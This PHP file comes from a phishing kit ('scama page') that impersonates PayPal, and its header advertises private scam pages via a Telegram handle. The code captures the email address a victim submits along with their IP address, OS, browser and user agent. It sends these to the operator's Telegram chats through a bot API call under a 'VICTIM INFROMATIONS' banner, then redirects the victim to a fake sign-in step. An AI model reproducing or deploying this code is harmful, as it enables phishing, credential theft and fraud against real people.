<?php
/*
Scama page by Nayfer
You want your private scama page ?
contact me on telegram @nayfercrax
*/
session_start();
error_reporting(0);
include "../myconfig/telegram.php";
include "../myconfig/settings.php";
$ip = getenv("REMOTE_ADDR");
if($_POST['login_m'] == ""){
  echo '<script>window.location = "../"</script>';
  exit();
}
$_SESSION['mail'] = $_POST['login_m'];
if($sendemail == 1){
 foreach($IdTelegram as $chatId) {
  $message = "[=====> 🔥🔥 PAYPAL [CRAXPRO.IO] | MAIL  🔥🔥  <=====]\n\n";
  $message .= "[ 👤  MAIL :      ".$_POST['login_m']."   ]\n\n";
  $message .= "[=====> VICTIM INFROMATIONS <=====]\n\n";
  $message .= "[ 🔍 IP :    ".$ip."\n";   
  $message .= "[ 🌐 OS :    ".$user_os."\n";  
  $message .= "[ 🌐 Browser :    ".$user_browser."\n";  
  $message .= "[ 🌐 UA :    ".$_SERVER['HTTP_USER_AGENT']."\n\n"; 
  $message .= "[=====>  🔥 BY @nayfercrax 🔥  <=====]";
  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId, 
      'text'=>$message,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
 }
 }
 $randomString = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 20, 100);

?>
<script type="text/javascript">window.location = "../signin/auth.php?<?php echo $randomString ?>"</script>
